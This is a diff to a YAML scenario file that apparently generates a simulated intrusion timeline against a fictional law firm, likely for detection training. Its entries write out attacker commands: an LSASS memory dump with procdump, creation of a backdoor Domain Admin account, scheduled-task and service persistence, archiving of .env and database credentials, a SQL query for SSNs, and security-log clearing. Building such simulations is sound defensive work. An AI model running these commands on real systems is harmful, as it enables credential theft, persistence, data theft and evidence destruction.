@@ -232,222 +232,247 @@ storyline:
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Failed logon attempt via password spray against david.okonkwo (wrong password)"
-    details:
-      source_ip: "185.220.101.34"
-      logon_type: 3
+    events:
+      - type: failed_logon
+        source_ip: "185.220.101.34"
+        logon_type: 3
 
   - time: "+31m"
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Failed logon attempt via password spray against david.okonkwo (account lockout threshold)"
-    details:
-      source_ip: "185.220.101.34"
-      logon_type: 3
+    events:
+      - type: failed_logon
+        source_ip: "185.220.101.34"
+        logon_type: 3
 
   - time: "+32m"
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Successful logon to david.okonkwo workstation with stolen credentials"
-    details:
-      source_ip: "185.220.101.34"
-      logon_type: 3
+    events:
+      - type: logon
+        source_ip: "185.220.101.34"
+        logon_type: 3
 
   # --- Phase 2: Reconnaissance ---
   - time: "+35m"
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Execute domain enumeration via net.exe to list domain users"
-    details:
-      process_name: "C:\\Windows\\System32\\net.exe"
-      command_line: "net user /domain"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user /domain"
 
   - time: "+36m"
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Execute reconnaissance to enumerate domain groups"
-    details:
-      process_name: "C:\\Windows\\System32\\net.exe"
-      command_line: "net group \"Domain Admins\" /domain"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" /domain"
 
   - time: "+37m"
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Execute network share enumeration"
-    details:
-      process_name: "C:\\Windows\\System32\\net.exe"
-      command_line: "net view \\\\FILE-SRV-01 /all"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net view \\\\FILE-SRV-01 /all"
 
   # --- Phase 3: Credential Dumping (Sysmon Event 8: CreateRemoteThread) ---
   - time: "+42m"
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Execute credential dumping tool targeting LSASS memory"
-    details:
-      process_name: "C:\\Windows\\Temp\\procdump64.exe"
-      command_line: "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\Temp\\procdump64.exe"
+        command_line: "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
 
   # --- Phase 4: Lateral Movement via RDP to IT admin workstation ---
   - time: "+55m"
     actor: attacker
     system: WS-JWALKER-01
     activity: "RDP lateral movement to IT admin workstation using james.walker credentials"
-    details:
-      source_ip: "10.20.10.11"
-      logon_type: 10
+    events:
+      - type: rdp_session
+        source_ip: "10.20.10.11"
 
   - time: "+57m"
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Logon with explicit credentials (RunAs) to access IT admin context"
-    details:
-      process_name: "C:\\Windows\\System32\\runas.exe"
-      command_line: "runas /user:HARTFIELD-LAW\\james.walker cmd.exe"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\runas.exe"
+        command_line: "runas /user:HARTFIELD-LAW\\james.walker cmd.exe"
 
   # --- Phase 5: Privilege Escalation — Add attacker-controlled account to Domain Admins ---
   - time: "+1h5m"
     actor: attacker
     system: DC-01
     activity: "Authenticate to domain controller with stolen admin credentials"
-    details:
-      source_ip: "10.20.10.13"
-      logon_type: 3
+    events:
+      - type: logon
+        source_ip: "10.20.10.13"
+        logon_type: 3
 
   - time: "+1h7m"
     actor: attacker
     system: DC-01
     activity: "Execute command to create backdoor domain account"
-    details:
-      process_name: "C:\\Windows\\System32\\net.exe"
-      command_line: "net user svc-audit P@ssw0rd2024! /add /domain"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user svc-audit P@ssw0rd2024! /add /domain"
 
   - time: "+1h8m"
     actor: attacker
     system: DC-01
     activity: "Execute command to add backdoor account to Domain Admins group"
-    details:
-      process_name: "C:\\Windows\\System32\\net.exe"
-      command_line: "net group \"Domain Admins\" svc-audit /add /domain"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" svc-audit /add /domain"
 
   # --- Phase 6: Persistence — Scheduled task + service install ---
   - time: "+1h15m"
     actor: attacker
     system: WS-JWALKER-01
     activity: "Execute schtasks to create persistence scheduled task"
-    details:
-      process_name: "C:\\Windows\\System32\\schtasks.exe"
-      command_line: "schtasks /Create /SC DAILY /TN \"\\Microsoft\\Windows\\Maintenance\\SystemHealthCheck\" /TR \"C:\\ProgramData\\updater.exe\" /RU SYSTEM /F"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\schtasks.exe"
+        command_line: "schtasks /Create /SC DAILY /TN \"\\Microsoft\\Windows\\Maintenance\\SystemHealthCheck\" /TR \"C:\\ProgramData\\updater.exe\" /RU SYSTEM /F"
 
   - time: "+1h17m"
     actor: attacker
     system: WS-JWALKER-01
     activity: "Execute sc.exe to install persistence service"
-    details:
-      process_name: "C:\\Windows\\System32\\sc.exe"
-      command_line: "sc create HealthMonitor binPath= \"C:\\ProgramData\\updater.exe\" start= auto DisplayName= \"System Health Monitor\""
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\sc.exe"
+        command_line: "sc create HealthMonitor binPath= \"C:\\ProgramData\\updater.exe\" start= auto DisplayName= \"System Health Monitor\""
 
   # --- Phase 7: SSH lateral movement to Linux web server ---
   - time: "+1h30m"
     actor: attacker
     system: WEB-01
     activity: "SSH lateral movement to web server from IT admin workstation"
-    details:
-      source_ip: "10.20.10.13"
-      logon_type: 3
+    events:
+      - type: ssh_session
+        source_ip: "10.20.10.13"
 
   - time: "+1h33m"
     actor: attacker
     system: WEB-01
     activity: "Execute reconnaissance commands on Linux web server"
-    details:
-      process_name: "/usr/bin/find"
-      command_line: "find /var/www -name '*.conf' -o -name '*.env' 2>/dev/null"
+    events:
+      - type: process
+        process_name: "/usr/bin/find"
+        command_line: "find /var/www -name '*.conf' -o -name '*.env' 2>/dev/null"
 
   - time: "+1h35m"
     actor: attacker
     system: WEB-01
     activity: "Execute command to archive web application database credentials"
-    details:
-      process_name: "/usr/bin/tar"
-      command_line: "tar czf /tmp/.backup.tar.gz /var/www/app/config/database.yml /var/www/app/.env"
+    events:
+      - type: process
+        process_name: "/usr/bin/tar"
+        command_line: "tar czf /tmp/.backup.tar.gz /var/www/app/config/database.yml /var/www/app/.env"
 
   # --- Phase 8: Collection from file server ---
   - time: "+2h"
     actor: attacker
     system: FILE-SRV-01
     activity: "Authenticate to file server to access privileged client data"
-    details:
-      source_ip: "10.20.10.13"
-      logon_type: 3
+    events:
+      - type: logon
+        source_ip: "10.20.10.13"
+        logon_type: 3
 
   - time: "+2h5m"
     actor: attacker
     system: FILE-SRV-01
     activity: "Execute search for privileged client documents"
-    details:
-      process_name: "C:\\Windows\\System32\\cmd.exe"
-      command_line: "cmd.exe /c dir /s /b \\\\FILE-SRV-01\\cases$\\*.docx \\\\FILE-SRV-01\\cases$\\*.pdf > C:\\Windows\\Temp\\filelist.txt"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\cmd.exe"
+        command_line: "cmd.exe /c dir /s /b \\\\FILE-SRV-01\\cases$\\*.docx \\\\FILE-SRV-01\\cases$\\*.pdf > C:\\Windows\\Temp\\filelist.txt"
 
   - time: "+2h10m"
     actor: attacker
     system: FILE-SRV-01
     activity: "Execute 7zip to archive collected client files for exfiltration"
-    details:
-      process_name: "C:\\Windows\\Temp\\7z.exe"
-      command_line: "7z.exe a -p\"infected\" C:\\Windows\\Temp\\docs.7z @C:\\Windows\\Temp\\filelist.txt"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\Temp\\7z.exe"
+        command_line: "7z.exe a -p\"infected\" C:\\Windows\\Temp\\docs.7z @C:\\Windows\\Temp\\filelist.txt"
 
   # --- Phase 9: SQL server data query ---
   - time: "+2h20m"
     actor: attacker
     system: SQL-SRV-01
     activity: "Authenticate to SQL server for data collection"
-    details:
-      source_ip: "10.20.10.13"
-      logon_type: 3
+    events:
+      - type: logon
+        source_ip: "10.20.10.13"
+        logon_type: 3
 
   - time: "+2h25m"
     actor: attacker
     system: SQL-SRV-01
     activity: "Execute sqlcmd to query client billing records"
-    details:
-      process_name: "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\SQLCMD.EXE"
-      command_line: "sqlcmd -S SQL-SRV-01 -d ClientBilling -Q \"SELECT TOP 5000 client_id, name, ssn, case_number, billing_amount FROM dbo.ClientRecords\" -o C:\\Windows\\Temp\\billing.csv -s\",\" -W"
+    events:
+      - type: process
+        process_name: "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\SQLCMD.EXE"
+        command_line: "sqlcmd -S SQL-SRV-01 -d ClientBilling -Q \"SELECT TOP 5000 client_id, name, ssn, case_number, billing_amount FROM dbo.ClientRecords\" -o C:\\Windows\\Temp\\billing.csv -s\",\" -W"
 
   # --- Phase 10: C2 communication + exfiltration ---
   - time: "+3h"
     actor: attacker
     system: WS-JWALKER-01
     activity: "Connect to C2 server for command and control communication"
-    details:
-      dst_ip: "91.219.236.180"
-      dst_port: 443
-      service: "https"
+    events:
+      - type: connection
+        dst_ip: "91.219.236.180"
+        dst_port: 443
+        service: "https"
 
   - time: "+3h10m"
     actor: attacker
     system: WS-JWALKER-01
     activity: "Exfiltrate archived client data to external cloud storage"
-    details:
-      dst_ip: "104.16.85.20"
-      dst_port: 443
-      service: "https"
+    events:
+      - type: connection
+        dst_ip: "104.16.85.20"
+        dst_port: 443
+        service: "https"
 
   # --- Phase 11: Defense evasion — clear logs ---
   - time: "+3h20m"
     actor: attacker
     system: WS-DOKONKWO-01
     activity: "Execute wevtutil to clear Windows Security event log"
-    details:
-      process_name: "C:\\Windows\\System32\\wevtutil.exe"
-      command_line: "wevtutil cl Security"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\wevtutil.exe"
+        command_line: "wevtutil cl Security"
+      - type: log_cleared
 
   # --- Phase 12: Account cleanup ---
   - time: "+3h25m"
     actor: attacker
     system: DC-01
     activity: "Execute command to delete backdoor account and remove evidence"
-    details:
-      process_name: "C:\\Windows\\System32\\net.exe"
-      command_line: "net user svc-audit /delete /domain"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user svc-audit /delete /domain"
 
 output:
   logs:
